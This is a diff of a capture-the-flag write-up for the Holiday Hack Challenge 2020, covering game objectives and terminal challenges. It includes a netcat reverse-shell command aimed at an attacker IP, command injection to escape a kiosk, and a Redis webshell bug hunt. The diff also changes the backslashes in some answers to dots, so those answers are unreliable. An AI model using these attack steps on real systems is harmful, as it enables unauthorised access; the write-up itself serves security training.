@@ -1,7 +1,26 @@
+---
+title: "Holiday Hack Challenge 2020"
+author: [Jeshua Erickson]
+date: "2020-12-25"
+subject: "Markdown"
+keywords: [Markdown, Example]
+subtitle: "Official Write-Up"
+lang: "en"
+titlepage: true
+titlepage-color: "1E90FF"
+titlepage-text-color: "FFFAFA"
+titlepage-rule-color: "FFFAFA"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
+---
+
 # Holiday Hack Challenge 2020: Three French Hens
 
 
-## Objective 1: Uncover Santa's Gift List
+
+# Objective 1: Uncover Santa's Gift List
 
 There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.
 
@@ -17,7 +36,8 @@ There is a photo of Santa's Desk on that billboard with his personal gift list. 
 **Answer:** "poxmark"
 
 
-## Objective 2: Investigate S3 Bucket
+
+# Objective 2: Investigate S3 Bucket
 
 When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.
 
@@ -39,7 +59,9 @@ When you unwrap the over-wrapped file, what text string is inside the package? T
 
 **Answer:** "North Pole: The Frostiest Place on Earth"
 
-## Objective 3: Point-of-Sale Password Recovery
+
+
+# Objective 3: Point-of-Sale Password Recovery
 
 Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?
 
@@ -69,7 +91,9 @@ const path = require('path');
 const SANTA_PASSWORD = 'santapass';
 ~~~
 
-## Objective 4: Operate the Santavator
+
+
+# Objective 4: Operate the Santavator
 
 Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
@@ -77,10 +101,12 @@ Talk to Pepper Minstix in the entryway to get some hints about the Santavator.
 
 
 Got some help from my kid on this one. :) 
+
 ![](screenshots/elevator.png)
 
 
-## Objective 5: Open HID Lock
+
+# Objective 5: Open HID Lock
 
 Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.
 
@@ -98,7 +124,8 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 ![](screenshots/black-badge.png)
 
 
-## Objective 6: Splunk Challenge
+
+# Objective 6: Splunk Challenge
 
 Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?
 
@@ -108,7 +135,7 @@ Access the Splunk terminal in the Great Room. What is the name of the adversary 
 
 Make sure you are "Santa" when you attempt this objective.
 
-### Question 1
+## Question 1
 
 How many distinct MITRE ATT&CK techniques did Alice emulate?
 
@@ -127,7 +154,7 @@ This was the recommended search
 | stats dc(technique)
 ~~~
 
-### Question 2
+## Question 2
 
 What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)
 
@@ -141,16 +168,16 @@ What are the names of the two indexes that contain the results of emulating Ente
 	- t1059.003-main
 	- t1059.003-win
 
-### Question 3
+## Question 3
 
 One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?    
 - Step 1: Notice that this is t1082
 - Step 2: Try this is the search "index=t1082-win"
 - Step 3: Go here: https://github.com/redcanaryco/atomic-red-team/search?p=2&q=system+information
 - Step 4: Find the answer on this page: https://github.com/redcanaryco/atomic-red-team/blob/8eb52117b748d378325f7719554a896e37bccec7/atomics/T1082/T1082.md
-- Answer: "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography"
+- Answer: "HKEY.LOCAL.MACHINE.SOFTWARE.Microsoft.Cryptography"
 
-### Question 4
+## Question 4
 
 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)
 
@@ -159,7 +186,7 @@ According to events recorded by the Splunk Attack Range, when was the first OSTA
 - Step 3: Find first instance of OSTAP
 - Answer: "2020-11-30T17:44:15Z" (OSTAP Worming Activity)
 
-### Question 5
+## Question 5
 
 One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?
 
@@ -172,7 +199,7 @@ One Atomic Red Team test executed by the Attack Range makes use of an open sourc
 	- (powershell command with the commandlet in it) (row 30)
 - Answer: 3648 (ProcessId)
 
-### Question 6
+## Question 6
 
 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?
 
@@ -183,7 +210,7 @@ Alice ran a simulation of an attacker abusing Windows registry run keys. This te
 - Step 5: Discover that this is discovery.bat
 - Answer: "quser"
 
-### Question 7
+## Question 7
 
 According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?
 
@@ -192,7 +219,7 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 - Step 3: Pick the most heavily used serial since this is a domain controller.
 - Answer: 55FCEEBB21270D9249E86F4B9DC7AA60
 
-### Challenge Question
+## Challenge Question
 
 - Step 1: Google "RFC 7465" to see what Alice talking about.
 - Step 2: Looks like RC4 encryption.
@@ -202,7 +229,9 @@ According to x509 certificate events captured by Zeek (formerly Bro), what is th
 
 **Answer:** "The Lollipop Guild"
 
-## Objective 7: Solve the Sleight's CAN-D-BUS Problem
+
+
+# Objective 7: Solve the Sleight's CAN-D-BUS Problem
 
 Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.
 
@@ -234,7 +263,9 @@ Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. 
 
 It works!
 
-## Objective 8: Broken Tag Generator
+
+
+# Objective 8: Broken Tag Generator
 
 Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.
 
@@ -328,7 +359,9 @@ Here's the result!
 
 **Answer:** "JackFrostWasHere"
 
-## Objective 9: ARP Shenanigans
+
+
+# Objective 9: ARP Shenanigans
 
 Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?
 
@@ -430,7 +463,9 @@ nc -e /bin/sh [attacking ip] 4444
 
 **Answer:** "Tanta Kringle"
 
-## Objective 10: Defeat Fingerprint Sensor
+
+
+# Objective 10: Defeat Fingerprint Sensor
 
 Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.
 
@@ -440,7 +475,9 @@ This required going into developer mode in Google Chrome. I saw one spot where t
 
 ![](screenshots/remove-besanta-condition.png)
 
-## Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 
+
+
+# Objective 11a: Naughty/Nice List with Blockchain Investigation Part 1 
 
 Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)
 
@@ -459,11 +496,13 @@ So apparently we need to do the following:
 **Answer:** 57066318f32f729d
 
 **blockchain.py**
+
+
 ~~~
-# we only need 312 nonces
+    #we only need 312 nonces
 
 for var in list(range(312)):
-    # start on block 1236
+    #start on block 1236
     var = var + 1236
     #print(c2.blocks[var].block_data)
     #print(c2.blocks[var].nonce)
@@ -471,19 +510,19 @@ for var in list(range(312)):
     hexNonce = (str('%016.016x' % (currentNonce)).encode('utf-8'))
    
 
-    # this is actually first (though it is the second half of the nonce)
+    #this is actually first (though it is the second half of the nonce)
     hexNonce_32a = (currentNonce  >> 32 ) & 0xffffffff
 
-    # this is second (though it is the first half of the nonce)
+    #this is second (though it is the first half of the nonce)
     hexNonce_32b = currentNonce & 0xffffffff
 
-    # this is how we feed the 32 nonce parts into the predictor
+    #this is how we feed the 32 nonce parts into the predictor
     print(hexNonce_32b)
     print(hexNonce_32a)
 
     # but when we put them back together for 64bit, we need to flip them back with 32a first.
-    # 32a prediction value was '0x57066318'
-    # 32b prediction value was '0xf32f729d'
+    #32a prediction value was '0x57066318'
+    #32b prediction value was '0xf32f729d'
 
     #print(hexNonce)
     #print(hex(hexNonce_32a))
@@ -497,40 +536,37 @@ Here's the final script that retrieves he predicted values:
 
 
 **blockchain-get-32.sh**
-~~~
-
-# blockchain.py is the script shown above
-
-# gets the last 624 of the split up values
-./blockchain.py | tail -n 624 > blockchain32.out
-
-# checks he file to make sure there is 624
-wc blockchain32.out
-
-# feeds the split 32 values into the predictor
-# then gets the last nonce pair of the four total that came back to get us to 130000
-cat blockchain32.out | mt19937predict | head -8 | tail -n 2
-
-# feed the resulting pair in reverse order back to the objective.
-
-echo "All Done!"
-
 
 ~~~
 
+ #blockchain.py is the script shown above
+
+ #gets the last 624 of the split up values
+ ./blockchain.py | tail -n 624 > blockchain32.out
+
+ #checks he file to make sure there is 624
+ wc blockchain32.out
+
+ #feeds the split 32 values into the predictor
+ #then gets the last nonce pair of the four total that came back to get us to 130000
+ cat blockchain32.out | mt19937predict | head -8 | tail -n 2
+
+ #feed the resulting pair in reverse order back to the objective.
+
+ echo "All Done!"
+
+
+~~~
 
 
 
+# Challenges
 
----
-
-## Challenges
-
-### Snowball Fight (Tangle Coalbox)
+# Snowball Fight (Tangle Coalbox)
 
 ![](screenshots/win-on-impossible.png)
 
-#### Steps
+## Steps
 
 - Step 1: Watch Tom Liston's talk.
 - Step 2: Clone Liston's  mt19937 GitHub repository. Review/run the code.
@@ -543,9 +579,9 @@ echo "All Done!"
 - Step 8: Transfer only 'hits' from easy mode over to impossible mode in terminal. Since they have the same seed then
   the 'hit's will be the same. This will allow you to make sure every shot in the impossible mode is successful.
 
-### Scapy Prepper (Alabaster Snowball)
+# Scapy Prepper (Alabaster Snowball)
 
-#### COMPLETED TASK #1:
+## COMPLETED TASK #1:
 Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
 Start by running the task.submit() function passing in a string argument of 'start'.
 Type task.help() for help on this question.
@@ -555,7 +591,7 @@ Correct! adding a () to a function or class will execute it. Ex - FunctionExecut
 >task.submit('start')
 
 
-#### COMPLETED TASK #2:
+## COMPLETED TASK #2:
 Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
 For example, task.submit(sendp) would submit the sendp scapy class used to send packets at layer 2 of the OSI model.
 Scapy classes can be found at ( https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html )
@@ -563,14 +599,14 @@ Correct! The "send" scapy class will send a crafted scapy packet out of a networ
 
 >task.submit(send)
 
-#### COMPLETED TASK #3:
+## COMPLETED TASK #3:
 Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.
 Look for "Sniff packets and return a list of packets." at the link ( https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html )
 Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.
 
 >task.submit(sniff)
 
-#### COMPLETED TASK #4:
+## COMPLETED TASK #4:
 Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
 1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
 2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
@@ -580,14 +616,14 @@ Correct! sr1 will send a packet, then immediately sniff for a response packet.
 
 >task.submit('1')
 
-#### COMPLETED TASK #5:
+## COMPLETED TASK #5:
 Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.
 Look for "Read a pcap or pcapng file and return a packet list" at the link ( https://scapy.readthedocs.io/en/latest/api/scapy.utils.html )
 Correct! the "rdpcap" scapy class can read pcap files.
 
 >task.submit(rdpcap)
 
-#### COMPLETED TASK #6:
+## COMPLETED TASK #6:
 The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:
 1. UDP_PACKETS.print()
 2. UDP_PACKETS.show()
@@ -597,7 +633,7 @@ Correct! .show() can be used on lists of packets AND on an individual packet.
 
 >task.submit('2')
 
-#### COMPLETED TASK #7:
+## COMPLETED TASK #7:
 Submit only the first packet found in UDP_PACKETS.
 You can specify an item from a list using "list_var_name[num]" where "num" is the item number you want starting at 0.
 
@@ -606,7 +642,7 @@ Correct! Scapy packet lists work just like regular python lists so packets can b
 >task.submit(UDP_PACKETS[0])
 
 
-#### COMPLETED TASK #8:
+## COMPLETED TASK #8:
 Submit only the entire TCP layer of the second packet in TCP_PACKETS.
 If you had a packet stored in a variable named pkt, you could access its IP layer using "pkt[IP]"
 Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]
@@ -615,7 +651,7 @@ Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DN
 
 >task.submit(pkt[TCP])
 
-#### COMPLETED TASK #9:
+## COMPLETED TASK #9:
 Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet
 pkt[IP].dst = "10.10.10.10" would changed the destination IP address of a packet in a variable named "pkt". Use this method to modify the src IP and submit the changed packet.
 Correct! You can change ALL scapy packet attributes using this method.
@@ -626,7 +662,7 @@ Correct! You can change ALL scapy packet attributes using this method.
 
 >task.submit(pkt)
 
-#### COMPLETED TASK #10:
+## COMPLETED TASK #10:
 Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
 You can access each packets Raw payload using TCP_PACKETS[0][Raw].load only incrementing 0 each packet. (if that particular packet has a payload)
 Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
@@ -634,16 +670,16 @@ Correct! Here is some really nice list comprehension that will grab all the raw 
 
 >TCP_PACKETS[6][Raw].load
 
->task.submit('echo\r\n')
+>task.submit('echo.r.n') 
 
-#### COMPLETED TASK #11:
+## COMPLETED TASK #11:
 The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.
 You could get the ICMP id value of the 3rd packet using ICMP_PACKETS[2][ICMP].id .
 Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .
 
 >task.submit(ICMP_PACKETS[1][ICMP].chksum)
 
-#### COMPLETED TASK #12:
+## COMPLETED TASK #12:
 Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
 1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
 2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
@@ -654,7 +690,7 @@ Correct! Once you assign the packet to a variable named "pkt" you can then use t
 >task.submit('3')
 
 
-#### COMPLETED TASK #13:
+## COMPLETED TASK #13:
 Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)
 Here is a good link on creating packets with scapy ( https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/creating_packets/index.html )
 Correct! Your UDP packet creation should look something like this:
@@ -664,7 +700,7 @@ Correct! Your UDP packet creation should look something like this:
 > task.submit(pkt)
 
 
-#### COMPLETED TASK #14:
+## COMPLETED TASK #14:
 Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of "elveslove.santa". (all other packet attributes can be unspecified)
 You can reference UDP_PACKETS[0] for a similar packet but dont use this exact packet but create a new one. You can also reference this link ( https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/creating_packets/index.html )
 Correct! Your UDP packet creation should look something like this:
@@ -673,7 +709,7 @@ Correct! Your UDP packet creation should look something like this:
 
 >task.submit(pkt)
 
-#### COMPLETED TASK #15:
+## COMPLETED TASK #15:
 The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.
 The three fields in ARP_PACKETS[1][ARP] that are incorrect are op, hwsrc, and hwdst. A sample ARP pcap can be referenced at https://www.cloudshark.org/captures/e4d6ea732135. You can run the "reset_arp()" function to reset the ARP packets back to their original form.
 Great, you prepared all the present packets!
@@ -690,7 +726,7 @@ Great, you prepared all the present packets!
 
 
 
-### Kringle Kiosk (Shinny Upatree)
+# Kringle Kiosk (Shinny Upatree)
 
 ![](screenshots/shinny-upatree.png)
 
@@ -706,7 +742,7 @@ Escape the menu by launching /bin/bash
 - Determined through errors that the application was "cowsay".
 - Used command injection with "&&" to add another command to the end of the file which was "bin/bash"
 
-### Unescape Tmux (Pepper Minstix)
+# Unescape Tmux (Pepper Minstix)
 
 ![](screenshots/pepper-minstix.png)
 
@@ -721,7 +757,7 @@ Can you help me find her? We were so attached!!
 
 - Used "tmux a" to attach the available tmux session
 
-### Linux Primer (Sugarplum Mary)
+# Linux Primer (Sugarplum Mary)
 
 ![](screenshots/sugarplum-mary.png)
 
@@ -748,11 +784,11 @@ Can you help me find her? We were so attached!!
 - Step 20: "curl localhost:54321"
 - Step 21: "pkill 14516_munchkin"
 
-### The Elf C0de (Ribb Bonbowford)
+# The Elf C0de (Ribb Bonbowford)
 
 Mischevious munchkins have nabbed all the North Pole's lollipops intended for good children all over the world. Use your JavaScript skills to retrieve the nabbed lollipops from all the entrances of KringleCon.
 
-### Redis Bug Hunt (Holly Evergreen)
+# Redis Bug Hunt (Holly Evergreen)
 ~~~
 We need your help!!
 
@@ -814,9 +850,6 @@ player@b71845abd4ae:~$ curl http://localhost/maintenance.php --output file
 player@b71845abd4ae:~$ ls                  
 file  maintenance.php
 player@b71845abd4ae:~$ cat file
-REDIS0009�      redis-ver5.0.3�
-�edis-bits�@�ctime���_used-mem�?
-/var/www/htmexample2#We think there's a bug in index.phexample1The site is in maintenance modetest@D<?php
 
 # We found the bug!!
 #
@@ -838,7 +871,7 @@ echo "Something is wrong with this page! Please use http://localhost/maintenance
 
 
 
-### Speaker UNPrep (Bushy Evergreen)
+# Speaker UNPrep (Bushy Evergreen)
 ~~~
 Help us get into the Speaker Unpreparedness Room!
 
@@ -859,7 +892,7 @@ Note: These don't require low-level reverse engineering, so you can put away IDA
 and Ghidra (unless you WANT to use them!)
 ~~~
 
-#### Part 1: Open the Door
+## Part 1: Open the Door
 
 - Step 1: Ran "strings door"
 - Step 2: Observed this output:
@@ -872,7 +905,7 @@ and Ghidra (unless you WANT to use them!)
 ~~~
 - Step 3: entered the password after being prompted when running the "door" binary
 
-#### Part 2: Turn on the Lights
+## Part 2: Turn on the Lights
 
 - Step 1: "cd lab"
 - Step 2: view "lights.conf" (this is where the username and password is)
@@ -902,7 +935,7 @@ If you've figured out the real password, be sure you run /home/elf/lights
 - Step 6: Notice that the password/username was decrypted! ---> "Computer-TurnLightsOn"
 - Step 7: Enter this password in the real "lights" binary prompt when you run it.
 
-#### Part 3: Vending Machine
+## Part 3: Vending Machine
 
 - Step 1: Rename config file.
 - Step 2: Try the vending machine binary int the lab and enter a new password:
@@ -928,7 +961,7 @@ If you've figured out the real password, be sure you run /home/elf/lights
 - Step 3: I tried nearly everything but apparently skipped "CandyCane1". Wow, that was an ordeal!
 
 
-### 33.6kbps (Fitzy Shortstack)
+# 33.6kbps (Fitzy Shortstack)
 
 - Step 1: Dial the number --> 756-8347
 - Step 2: Use the following sequence
@@ -940,7 +973,7 @@ If you've figured out the real password, be sure you run /home/elf/lights
 - Step 3: Got hint to talk to Shinny Upatree (to steal his tag ID) :)
 	- "2006e22f13" 
 
-### Scapy Prepper (Alabaster Snowball)
+# Scapy Prepper (Alabaster Snowball)
 ~~~
 ╔════════════════════════════════════════════════════════════════╗
 ║  ___ ___ ___ ___ ___ _  _ _____   ___  _   ___ _  _____ _____  ║
@@ -957,7 +990,7 @@ If you've figured out the real password, be sure you run /home/elf/lights
 Type "yes" to begin. 
 ~~~
 
-### CAN-Bus Investigation (Wunorse Openslae)
+# CAN-Bus Investigation (Wunorse Openslae)
 ~~~
 Welcome to the CAN bus terminal challenge!
 
